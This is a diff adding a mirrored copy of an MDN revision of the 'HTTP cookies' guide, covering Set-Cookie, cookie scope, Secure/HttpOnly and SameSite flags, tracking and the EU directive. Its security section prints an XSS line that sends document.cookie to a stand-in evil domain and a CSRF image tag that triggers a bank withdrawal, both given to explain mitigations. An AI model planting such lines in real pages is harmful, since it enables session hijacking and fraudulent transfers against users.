@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="redesign no-js"  data-ffo-opensanslight=false data-ffo-opensans=false >
+
+<!-- Mirrored from developer.mozilla.org/en-US/docs/Web/HTTP/Cookies$revision/1143319 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Dec 2016 16:47:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <script>(function(d) { d.className = d.className.replace(/\bno-js/, ''); })(document.documentElement);</script>
+  
+    
+  
+
+  
+  <title>Revision 1143319 | HTTP cookies | MDN</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="index, follow">
+    <link rel="home" href="https://developer.mozilla.org/en-US/">
+    <link rel="copyright" href="#copyright">
+  
+
+  
+    
+    <link href="../../../../../../developer.cdn.mozilla.net/static/build/styles/mdn.102019a5db43.css" rel="stylesheet" type="text/css" />
+
+    
+  
+    <link href="../../../../../../developer.cdn.mozilla.net/static/build/styles/wiki.d9818563511b.css" rel="stylesheet" type="text/css" />
+
+    <!-- common social tags -->
+    
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://developer.cdn.mozilla.net/static/img/opengraph-logo.dc4e08e2f6af.png">
+    <meta property="og:site_name" content="Mozilla Developer Network">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="https://developer.cdn.mozilla.net/static/img/opengraph-logo.dc4e08e2f6af.png">
+    <meta name="twitter:site" content="@MozDevNet">
+    <meta name="twitter:creator" content="@MozDevNet">
+    <link rel="search" type="application/opensearchdescription+xml" href="https://developer.mozilla.org/en-US/search/xml" title="Mozilla Developer Network">
+  
+
+  <!-- third-generation iPad with high-resolution Retina display: -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../../../../../developer.cdn.mozilla.net/static/img/favicon144.a6e4162070f4.png">
+  <!-- iPhone with high-resolution Retina display: -->
+  <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../../../../../../developer.cdn.mozilla.net/static/img/favicon114.0e9fabd44f85.png">
+  <!-- first- and second-generation iPad: -->
+  <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../../../../../../developer.cdn.mozilla.net/static/img/favicon72.8ff9d87c82a0.png">
+  <!-- non-Retina iPhone, iPod Touch, and Android 2.1+ devices: -->
+  <link rel="apple-touch-icon-precomposed" href="../../../../../../developer.cdn.mozilla.net/static/img/favicon57.a2490b9a2d76.png">
+  <!-- basic favicon -->
+  
+    
+  
+  <link rel="shortcut icon" href="../../../../../../developer.cdn.mozilla.net/static/img/favicon32.e02854fdcf73.png">
+  <!--[if IE]>
+  <meta http-equiv="imagetoolbar" content="no">
+  <script type="text/javascript" src="https://developer.cdn.mozilla.net/static/build/js/html5shiv.3948ccddab6f.js" charset="utf-8"></script>
+  <![endif]-->
+
+  
+
+  
+    
+
+<script type="text/javascript">
+
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','../../../../../../www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-36116321-5', 'mozilla.org');
+    ga('set', 'anonymizeIp', true);
+
+    
+
+    // dimension9 == "Section editing"
+    
+
+    (function() {
+        // http://cfsimplicity.com/61/removing-analytics-clutter-from-campaign-urls
+        var win = window;
+        var removeUtms = function(){
+            var location = win.location;
+            if (location.href.indexOf('utm') != -1 && win.history.replaceState) {
+                win.history.replaceState({}, '', location.pathname);
+            }
+        };
+
+        ga('send', 'pageview', {'hitCallback': removeUtms});
+    })();
+</script>
+
+  
+</head>
+<body  class="">
+
+  <script type="text/javascript">
+    (function(win) {
+        'use strict';
+
+        
+            (function(){
+  var FLAGS = {
+    'compat_api': false,'iperceptions': false,'kumaediting': false,'page_move': false,'registration_disabled': false,'search_suggestions': false,'section_edit': false,'sg_task_completion': false,'spam_admin_override': false,'spam_checks_enabled': true,'spam_spammer_override': false,'spam_submissions_enabled': false,'spam_testing_mode': false,'wiki_samples': true,'wiki_spam_exempted': false,'wiki_spam_training': false
+    },
+    SWITCHES = {
+    'wiki_error_on_delete': false,'wiki_force_immediate_rendering': false,'enable_optimizely': false,'welcome_email': true,'application_ACAO': true,'store_revision_ips': true,'dumb_doc_urls': true,'newsletter': true,'newsletter_article': true,'foundation_callout': true
+    },
+    SAMPLES = {
+    
+    };
+  window.waffle = {
+    "flag_is_active": function waffle_flag(flag_name) {
+      
+      return !!FLAGS[flag_name];
+    },
+    "switch_is_active": function waffle_switch(switch_name) {
+      
+      return !!SWITCHES[switch_name];
+    },
+    "sample_is_active": function waffle_sample(sample_name) {
+      
+      return !!SAMPLES[sample_name];
+    },
+    "FLAGS": FLAGS,
+    "SWITCHES": SWITCHES,
+    "SAMPLES": SAMPLES
+  };
+})();
+
+        
+
+        // This needs to be set before ckeditor.js loads
+        window.CKEDITOR_BASEPATH = 'https://developer.mozilla.org/static/js/libs/ckeditor/build/ckeditor/';
+
+        // This represents the site configuration
+        win.mdn = {
+            // Properties and settings for CKEditor will go here
+            ckeditor: {},
+            // Feature test results and methods will be placed here
+            features: {},
+            // The path to static assets (images, CSS, JS) in MDN
+            staticPath: 'https://developer.cdn.mozilla.net/static/',
+            // Optimizely API
+            optimizely: win['optimizely'] || [],
+            // Site notifications
+            
+            notifications: [],
+            
+            // Wiki-specific settings will be placed here
+            wiki: {
+                autosuggestTitleUrl: '/en-US/docs/get-documents'
+            },
+            // Assets that need to be dynamically injected
+            assets: {
+                css: {
+                    'editor-content': ['https://developer.cdn.mozilla.net/static/build/styles/editor-content.e79881a73508.css',],
+                    'wiki-compat-tables': ['https://developer.cdn.mozilla.net/static/build/styles/wiki-compat-tables.a042fac0d66c.css',]
+                },
+                js: {
+                    'syntax-prism': ['https://developer.cdn.mozilla.net/static/build/js/syntax-prism.7a66ddfa68bf.js',],
+                    'wiki-compat-tables': ['https://developer.cdn.mozilla.net/static/build/js/wiki-compat-tables.14ce5dcb2c3d.js',]
+                }
+            }
+        };
+    })(this);
+</script>
+
+  
+
+  <ul id="nav-access">
+    <li><a href="#content" id="skip-main">Skip to main content</a></li>
+    <li><a id="skip-language" href="#language">Select language</a></li>
+    <li><a href="#q" id="skip-search">Skip to search</a></li>
+  </ul>
+
+  <!-- Header -->
+  <header id="main-header"><div class="center">
+
+    <div id="tabzilla">
+        <a href="http://www.mozilla.org/" class="no-track">mozilla</a>
+    </div>
+
+    <div class="clear header-clear"></div>
+
+
+    <a href="https://developer.mozilla.org/en-US/" class="logo">Mozilla Developer Network</a>
+
+
+    <div id="nav-sec">
+        
+                  <ul>
+                  <li><div class="login">
+    
+      
+       <a href="https://developer.mozilla.org/users/github/login/?next=%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FCookies%24revision%2F1143319" class="login-link js-login-link" data-service="GitHub">
+        Sign in
+        <i class="icon-github" aria-hidden="true"></i>
+      </a>
+    
+</div></li>
+                </ul>
+        
+    </div>
+
+    <nav id="main-nav" role="navigation"><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web">Web Technologies<i aria-hidden="true" class="icon-caret-down"></i></a>
+
+        <div class="submenu submenu-cols-2 js-submenu" id="nav-platform-submenu">
+          <div class="submenu-column">
+            <div class="title">Technologies</div>
+            <ul>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML">HTML</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS">CSS</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">JavaScript</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/Graphics">Graphics</a></li>
+              <li><a href="../../HTTP.html">HTTP</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/API">APIs / DOM</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions">WebExtensions</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/MathML">MathML</a></li>
+            </ul>
+          </div><div class="submenu-column last">
+            <div class="title">References & Guides</div>
+            <ul>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Learn">Learning web development</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/Tutorials">Tutorials</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/Reference">References</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide">Developer Guides</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility">Accessibility</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Games">Game development</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Web">...more docs</a></li>
+            </ul>
+          </div>
+        </div>
+      </li><li><a href="https://developer.mozilla.org/en-US/docs/Zones">Mozilla Docs<i aria-hidden="true" class="icon-caret-down"></i></a>
+
+        <div class="submenu js-submenu" id="nav-zones-submenu">
+          <div class="submenu-column">
+            <ul>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons">Add-ons</a></li>
+              <li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Firefox">Firefox</a></li>
+            </ul>
+          </div>
+        </div>
+      </li><li><a href="https://developer.mozilla.org/en-US/docs/Tools">Developer Tools</a></li><li><a href="https://developer.mozilla.org/en-US/docs/MDN/Feedback">Feedback<i aria-hidden="true" class="icon-caret-down"></i></a>
+
+        <div class="submenu js-submenu" id="nav-contact-submenu">
+          <div class="submenu-column">
+            <ul>
+                <li><a href="https://support.mozilla.org/">Get Firefox help<i aria-hidden="true" class="icon-external-link"></i></a></li>
+                <li><a href="http://stackoverflow.com/">Get web development help<i aria-hidden="true" class="icon-external-link"></i></a></li>
+            </ul>
+            <ul>
+              <li><a href="https://developer.mozilla.org/en-US/docs/MDN/Community">Join the MDN community</a></li>
+              <li><a target="_blank" href="https://bugzilla.mozilla.org/form.doc?bug_file_loc=https%3A//developer.mozilla.org/en-US/docs/Web/HTTP/Cookies%24revision/1143319">Report a content problem<i aria-hidden="true" class="icon-external-link"></i></a></li>
+              <li><a target="_blank" href="https://bugzilla.mozilla.org/form.mdn">Report a bug<i aria-hidden="true" class="icon-external-link"></i></a></li>
+            </ul>
+          </div>
+        </div>
+
+      </li><li class="nav-search-link"><a href="https://developer.mozilla.org/en-US/search" title="Search"><i aria-hidden="true" class="icon-search"></i></a></li><li class="main-nav-search"><form action="https://developer.mozilla.org/en-US/search" method="get" role="search">
+        <div class="search-wrap">
+          <label for="main-q" class="offscreen">Search</label>
+          <input type="search" id="main-q" name="q" placeholder="Search" data-value="" value="" />
+          <span class="search-trigger"><i aria-hidden="true" class="icon-search"></i></span>&nbsp;
+          <button type="submit" class="offscreen">Search</button>
+        </div>
+      </form></li></ul></nav>
+  </div></header>
+
+  <!-- Content will go here -->
+  <main id="content"><div class="center clear">
+  
+
+  <article>
+    <h1>Revision 1143319 of <a href="../Cookies.html">HTTP cookies</a></h1>
+
+    <details class="h2" open="open">
+      <summary class="hidden">Revision Information</summary>
+      <div class="revision-info">
+        <ul>
+          <li>
+            <mark>Revision slug:</mark>
+            <span>Web/HTTP/Cookies</span>
+          </li>
+          <li>
+            <mark>Revision title:</mark>
+            <span>HTTP cookies</span>
+          </li>
+          <li class="revision-id">
+            <mark>Revision id:</mark>
+            <span>1143319</span>
+          </li>
+          <li class="revision-created">
+            <mark>Created:</mark>
+            <span><time datetime="2016-11-15T13:35:22-08:00">Nov 15, 2016, 1:35:22 PM</time></span>
+          </li>
+          <li>
+            <mark>Creator:</mark>
+            <span>RosevearDev</span>
+            
+          </li>
+          <li>
+            <mark>Is current revision?</mark>
+            <span>No</span>
+          </li>
+          <li>
+            <mark>Comment</mark>
+            <span>Grammar</span>
+          </li>
+          
+        </ul>
+      </div>
+    </details>
+
+    <div class="wiki-block contributors">
+      
+      
+  <div class="tag-attach-list contributors-sub">
+    <i aria-hidden="true" class="icon-tags icon-fw"></i>
+    <strong>Tags:</strong>&nbsp;
+    <ul class="tags tags-small">
+      
+        <li><a href="https://developer.mozilla.org/en-US/docs/tag/cookies">cookies</a></li>
+      
+        <li><a href="https://developer.mozilla.org/en-US/docs/tag/Cookies">Cookies</a></li>
+      
+        <li><a href="https://developer.mozilla.org/en-US/docs/tag/Guide">Guide</a></li>
+      
+        <li><a href="https://developer.mozilla.org/en-US/docs/tag/HTTP">HTTP</a></li>
+      
+    </ul>
+  </div>
+
+    </div>
+
+    
+      <details open="open">
+        <summary><h2>Revision Content</h2></summary>
+        <article id="wikiArticle" class="text-content">
+          <div>{{HTTPSidebar}}</div>
+
+<p class="summary">An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser, that may store it and send it back together with the next request to the same server. Typically. it is used to know if two requests came from the same browser allowing to keep a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.</p>
+
+<p>Cookies are mainly used for these three purposes:</p>
+
+<ul>
+ <li>Session management (user logins, shopping carts)</li>
+ <li>Personalization (user preferences)</li>
+ <li>Tracking (analyzing user behavior)</li>
+</ul>
+
+<p>Cookies have also been used for general client-side storage. While this use could have been considered legitimate at a time when there was no other way to store data on the client side, it is no longer the case nowadays where web browsers are capable of using various storage APIs. Since cookies are sent along with every request, it can be an additional performance burden (especially for mobile web). New APIs to consider for local storage are the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> (<code>localStorage</code> and <code>sessionStorage</code>) and<a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API"> IndexedDB</a>.</p>
+
+<div class="note">
+<p>To see stored cookies (and other various types of storage that a web page can use), you can enable the <a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> in the Developer Tools and select the Cookies storage type from the storage tree.</p>
+</div>
+
+<h2 id="Creating_cookies">Creating cookies</h2>
+
+<p>When receiving an HTTP request, a server can send a {{HTTPHeader("Set-Cookie")}} header with the response. The cookie is usually stored by the browser and, afterwards, the cookie value is sent along with every request made to the same server as the content of a {{HTTPHeader("Cookie")}} HTTP header. Additionally, an expiration delay can be specified as well as restrictions to a specific domain and path, limiting how long and to which site the cookie is sent to.</p>
+
+<h3 id="The_Set-Cookie_and_Cookie_headers">The <code>Set-Cookie</code> and Cookie headers</h3>
+
+<p>The {{HTTPHeader("Set-Cookie")}} HTTP response header is used to send cookies from the server to the user agent. A simple cookie can be set like this:</p>
+
+<pre class="syntaxbox">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</pre>
+
+<p>The server tells the client to store a cookie (for example, applications like <a href="http://php.net/manual/en/function.setcookie.php">PHP</a>, <a href="https://nodejs.org/dist/latest-v6.x/docs/api/http.html#http_response_setheader_name_value">Node.js</a>, <a href="https://docs.python.org/3/library/http.cookies.html">Python</a>, or <a href="http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a> do it). The response sent to the browser will contain the <code>Set-Cookie</code> header and the browser will store the cookie.</p>
+
+<pre>HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]</pre>
+
+<p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the {{HTTPHeader("Cookie")}} header.</p>
+
+<pre>GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</pre>
+
+<h3 id="Session_cookies">Session cookies</h3>
+
+<p>The simple cookie created above is a <em>session cookie</em>: It will get removed when the client is shut down, they last only for the duration of the session. They don't specify any <code>Expires</code> or <code>Max-Age</code> directives. Note, however, that web browsers often have session restoring enabled, which will make most session cookies actually permanent as if the browser was never closed.</p>
+
+<h3 id="Permanent_cookies">Permanent cookies</h3>
+
+<p>Instead of expiring when the client is closed, <em>permanent cookies</em> expire at a specific date (<code>Expires</code>) or after a specific length of time (<code>Max-Age</code>).</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre>
+
+<h3 id="Secure_and_HttpOnly_cookies">Secure and <code>HttpOnly</code> cookies</h3>
+
+<p>A secure cookie will only be sent to the server when a request is made using SSL and the HTTPS protocol. However, note that confidential or sensitive information should <em>never</em> be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure and this flag won't offer you any additional encryption or security.</p>
+
+<p>To prevent cross-site scripting ({{Glossary("XSS")}}) attacks, HTTP-only cookies aren't accessible via JavaScript through the {{domxref("Document.cookie")}} property, the {{domxref("XMLHttpRequest")}} and {{domxref("Request")}} APIs. Set this flag when you don't need your cookies available in JavaScript. In particular, if you use cookies only to define a session, you don't need it in JavaScript and the <code>HttpOnly</code> flag should be set.</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre>
+
+<h3 id="Scope_of_cookies">Scope of cookies</h3>
+
+<p>The <code>Domain</code> and <code>Path</code> directives define the <em>scope</em> of the cookie, that is the set of URLs the cookies should be sent back to.</p>
+
+<p><code>Domain</code> specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). If a domain is specified, subdomains are always included.</p>
+
+<p>If <code>Domain=mozilla.org</code> is set, cookies are included on subdomains like <code>developer.mozilla.org</code>.</p>
+
+<p><code>Path</code> indicates a URL path that must exist in the requested resource before sending the <code>Cookie</code> header. The %x2F ("/") character is interpreted as a directory separator and sub directories will be matched as well.</p>
+
+<p>If <code>Path=/docs</code> is set, these paths will all be matched:</p>
+
+<ul>
+ <li>"/docs",</li>
+ <li>"/docs/Web/",</li>
+ <li>"/docs/Web/HTTP"</li>
+</ul>
+
+<h3 id="SameSite_cookies_experimental_inline"><code>SameSite</code> cookies {{experimental_inline}}</h3>
+
+<p><code>SameSite</code> cookies allow servers to assert that a cookie ought not to be sent along with cross-site requests, which provides some protection against cross-site request forgery attacks ({{Glossary("CSRF")}}). <code>SameSite</code> cookies are still experimental and not yet supported by all browsers.</p>
+
+<h3 id="JavaScript_access_using_Document.cookies">JavaScript access using Document.cookies</h3>
+
+<p>New cookies can also be created using the {{domxref("Document.cookie")}} property, and if the <code>HttpOnly</code> flag is not set, existing cookies can be accessed from JavaScript as well.</p>
+
+<pre class="brush: js">document.cookie = "yummy_cookie=choco"; 
+document.cookie = "tasty_cookie=strawberry"; 
+console.log(document.cookie); 
+// logs "yummy_cookie=choco; tasty_cookie=strawberry"</pre>
+
+<p>Please note the security implications as noted in the <a href="../Cookies.html#Security">Security</a> section below. Cookies that are available to JavaScript might get stolen through XSS.</p>
+
+<ul>
+</ul>
+
+<h2 id="Security">Security</h2>
+
+<div class="note">
+<p>Confidential or sensitive information should never be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure.</p>
+</div>
+
+<h3 id="Session_hijacking_and_XSS">Session hijacking and XSS</h3>
+
+<p>Cookies are often used in web application to identify a user and their authenticated session. So stealing a cookie from a web application can lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an {{Glossary("XSS")}} vulnerability in the application.</p>
+
+<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</pre>
+
+<p>The <code>HttpOnly</code> cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.</p>
+
+<h3 id="Cross-site_request_forgery_(CSRF)">Cross-site request forgery (CSRF)</h3>
+
+<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">Wikipedia</a> mentions a good example for {{Glossary("CSRF")}}. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:</p>
+
+<pre class="brush: html">&lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt;</pre>
+
+<p>Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:</p>
+
+<ul>
+ <li>As with {{Glossary("XSS")}}, input filtering is import.</li>
+ <li>There should always be a confirmation required for any sensitive action.</li>
+ <li>Cookies that are used for sensitive actions should have a short lifetime only.</li>
+ <li>For more prevention tips, see the <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF prevention cheat sheet</a>.</li>
+</ul>
+
+<h2 id="Tracking_and_privacy">Tracking and privacy</h2>
+
+<h3 id="Third-party_cookies">Third-party cookies</h3>
+
+<p>Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a <em>first-party cookie</em>. If the domain is different, it is said to be a <em>third-party cookie</em>. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the <a href="https://www.google.com/policies/technologies/types/">types of cookies used by Google</a>. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, <a href="https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/">Privacy Badger</a> by the <a href="https://www.eff.org/">EFF</a>).</p>
+
+<p>If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikipedia's <a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>.</p>
+
+<ul>
+</ul>
+
+<h3 id="Do-Not-Track">Do-Not-Track</h3>
+
+<p>There are no legal or technological requirements for its use, but the {{HTTPHeader("DNT")}} header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the {{HTTPHeader("DNT")}} header for more information.</p>
+
+<h3 id="EU_cookie_directive">EU cookie directive</h3>
+
+<p>Requirements for cookies across the EU are defined in <a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">Directive 2009/136/EC</a> of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.</p>
+
+<p>In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners since then to inform the user about the use of cookies.</p>
+
+<p>For more, see <a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">this Wikipedia section</a> and consult state laws for the latest and most accurate information.</p>
+
+<h3 id="Zombie_cookies_and_Evercookies">Zombie cookies and Evercookies</h3>
+
+<p>A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a>, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.</p>
+
+<ul>
+ <li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">Zombie cookies on Wikipedia</a></li>
+</ul>
+
+<h2 id="See_also">See also</h2>
+
+<ul>
+ <li>{{HTTPHeader("Set-Cookie")}}</li>
+ <li>{{HTTPHeader("Cookie")}}</li>
+ <li>{{domxref("Document.cookie")}}</li>
+ <li>{{domxref("Navigator.cookieEnabled")}}</li>
+ <li><a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Inspecting cookies using the Storage Inspector</a></li>
+ <li><a class="external" href="https://tools.ietf.org/html/rfc6265">Cookie specification: RFC 6265</a></li>
+ <li><a class="external" href="https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/">Nicholas Zakas article on cookies</a></li>
+ <li><a class="external" href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Nicholas Zakas article on cookies and security</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie on Wikipedia</a></li>
+</ul>
+        </article>
+      </details>
+    
+
+    <details >
+      <summary><h2>Revision Source</h2></summary>
+      <div id="doc-source">
+        <pre class="brush:js">&lt;div&gt;{{HTTPSidebar}}&lt;/div&gt;
+
+&lt;p class=&#34;summary&#34;&gt;An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user&#39;s web browser, that may store it and send it back together with the next request to the same server. Typically. it is used to know if two requests came from the same browser allowing to keep a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.&lt;/p&gt;
+
+&lt;p&gt;Cookies are mainly used for these three purposes:&lt;/p&gt;
+
+&lt;ul&gt;
+ &lt;li&gt;Session management (user logins, shopping carts)&lt;/li&gt;
+ &lt;li&gt;Personalization (user preferences)&lt;/li&gt;
+ &lt;li&gt;Tracking (analyzing user behavior)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cookies have also been used for general client-side storage. While this use could have been considered legitimate at a time when there was no other way to store data on the client side, it is no longer the case nowadays where web browsers are capable of using various storage APIs. Since cookies are sent along with every request, it can be an additional performance burden (especially for mobile web). New APIs to consider for local storage are the &lt;a href=&#34;/en-US/docs/Web/API/Web_Storage_API&#34; title=&#34;DOM Storage&#34;&gt;Web storage API&lt;/a&gt; (&lt;code&gt;localStorage&lt;/code&gt; and &lt;code&gt;sessionStorage&lt;/code&gt;) and&lt;a href=&#34;/en-US/docs/Web/API/IndexedDB_API&#34;&gt; IndexedDB&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&#34;note&#34;&gt;
+&lt;p&gt;To see stored cookies (and other various types of storage that a web page can use), you can enable the &lt;a href=&#34;/en-US/docs/Tools/Storage_Inspector&#34;&gt;Storage Inspector&lt;/a&gt; in the Developer Tools and select the Cookies storage type from the storage tree.&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&#34;Creating_cookies&#34;&gt;Creating cookies&lt;/h2&gt;
+
+&lt;p&gt;When receiving an HTTP request, a server can send a {{HTTPHeader(&#34;Set-Cookie&#34;)}} header with the response. The cookie is usually stored by the browser and, afterwards, the cookie value is sent along with every request made to the same server as the content of a {{HTTPHeader(&#34;Cookie&#34;)}} HTTP header. Additionally, an expiration delay can be specified as well as restrictions to a specific domain and path, limiting how long and to which site the cookie is sent to.&lt;/p&gt;
+
+&lt;h3 id=&#34;The_Set-Cookie_and_Cookie_headers&#34;&gt;The &lt;code&gt;Set-Cookie&lt;/code&gt; and Cookie headers&lt;/h3&gt;
+
+&lt;p&gt;The {{HTTPHeader(&#34;Set-Cookie&#34;)}} HTTP response header is used to send cookies from the server to the user agent. A simple cookie can be set like this:&lt;/p&gt;
+
+&lt;pre class=&#34;syntaxbox&#34;&gt;
+Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;The server tells the client to store a cookie (for example, applications like &lt;a href=&#34;http://php.net/manual/en/function.setcookie.php&#34;&gt;PHP&lt;/a&gt;, &lt;a href=&#34;https://nodejs.org/dist/latest-v6.x/docs/api/http.html#http_response_setheader_name_value&#34;&gt;Node.js&lt;/a&gt;, &lt;a href=&#34;https://docs.python.org/3/library/http.cookies.html&#34;&gt;Python&lt;/a&gt;, or &lt;a href=&#34;http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html&#34;&gt;Ruby on Rails&lt;/a&gt; do it). The response sent to the browser will contain the &lt;code&gt;Set-Cookie&lt;/code&gt; header and the browser will store the cookie.&lt;/p&gt;
+
+&lt;pre&gt;
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]&lt;/pre&gt;
+
+&lt;p id=&#34;The_client_sends_back_to_the_server_its_cookies_previously_stored&#34;&gt;Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the {{HTTPHeader(&#34;Cookie&#34;)}} header.&lt;/p&gt;
+
+&lt;pre&gt;
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+&lt;/pre&gt;
+
+&lt;h3 id=&#34;Session_cookies&#34;&gt;Session cookies&lt;/h3&gt;
+
+&lt;p&gt;The simple cookie created above is a &lt;em&gt;session cookie&lt;/em&gt;: It will get removed when the client is shut down, they last only for the duration of the session. They don&#39;t specify any &lt;code&gt;Expires&lt;/code&gt; or &lt;code&gt;Max-Age&lt;/code&gt; directives. Note, however, that web browsers often have session restoring enabled, which will make most session cookies actually permanent as if the browser was never closed.&lt;/p&gt;
+
+&lt;h3 id=&#34;Permanent_cookies&#34;&gt;Permanent cookies&lt;/h3&gt;
+
+&lt;p&gt;Instead of expiring when the client is closed, &lt;em&gt;permanent cookies&lt;/em&gt; expire at a specific date (&lt;code&gt;Expires&lt;/code&gt;) or after a specific length of time (&lt;code&gt;Max-Age&lt;/code&gt;).&lt;/p&gt;
+
+&lt;pre&gt;
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;&lt;/pre&gt;
+
+&lt;h3 id=&#34;Secure_and_HttpOnly_cookies&#34;&gt;Secure and &lt;code&gt;HttpOnly&lt;/code&gt; cookies&lt;/h3&gt;
+
